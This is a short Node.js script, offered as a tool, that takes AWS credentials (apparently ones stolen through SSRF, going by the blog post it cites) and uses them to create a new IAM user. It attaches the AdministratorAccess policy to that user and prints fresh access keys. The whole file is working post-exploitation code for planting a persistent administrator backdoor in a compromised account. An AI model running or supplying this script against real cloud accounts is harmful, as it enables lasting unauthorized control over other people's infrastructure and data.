const AWS = require('aws-sdk');

const [UserName, accessKeyId, secretAccessKey, sessionToken] = process.argv.slice(2);
if (!UserName || !accessKeyId || !secretAccessKey || !sessionToken) {
  console.log('Creates a AWS user with an administrator attached policy.');
  console.log('');
  console.log('Usage: node tool.js userName accessKeyId secretAccessKey sessionToken');
  console.log('');
  console.log('(based on https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6)');
  process.exit(-1);
}

// setup credentials
AWS.config.credentials = new AWS.Credentials(accessKeyId, secretAccessKey, sessionToken);

// instantiate service
const iam = new AWS.IAM();

const PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess';

(async () => {
  let data = await iam.createUser({ UserName }).promise();
  console.log('');
  console.log(`USER: ${JSON.stringify(data)}`);
  console.log('');
  await iam.attachUserPolicy({ UserName, PolicyArn }).promise();
  data = await iam.createAccessKey({ UserName }).promise();
  console.log(`ACCESS KEY: ${JSON.stringify(data)}`);
  console.log('');
})();
